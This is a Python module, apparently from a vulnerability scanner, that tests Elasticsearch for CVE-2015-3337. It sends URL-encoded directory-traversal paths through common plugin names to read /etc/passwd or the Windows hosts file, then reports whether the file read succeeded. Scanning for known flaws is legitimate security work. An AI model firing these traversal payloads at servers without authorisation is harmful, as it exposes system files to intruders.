#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2015_3337_payloads = [
    {'path': '_plugin/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'},
    {'path': '_plugin/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\Windows\System32\drivers\etc\hosts'},
    {'path': '_plugin/{PLUGIN}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts'},
    # {'path': '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'},
    # {'path': '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\Windows\System32\drivers\etc\hosts'},
    # {'path': '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts'},
]

def cve_2015_3337_scan(self, clients):
    ''' 在安装了具有“site”功能的插件以后, 插件目录使用../即可向上跳转, 
        导致目录穿越漏洞, 可读取任意文件, 没有安装任意插件的elasticsearch不受影响
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2015-3337',
    }
    
    pluginList = ['head', 'test', 'kopf', 'HQ', 'marvel', 'bigdesk']

    for payload in cve_2015_3337_payloads:
        for plugin in pluginList:
            path = payload['path'].format(PLUGIN=plugin)

            res = client.request(
                'get',
                path,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (check.check_res_fileread(res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
    return None
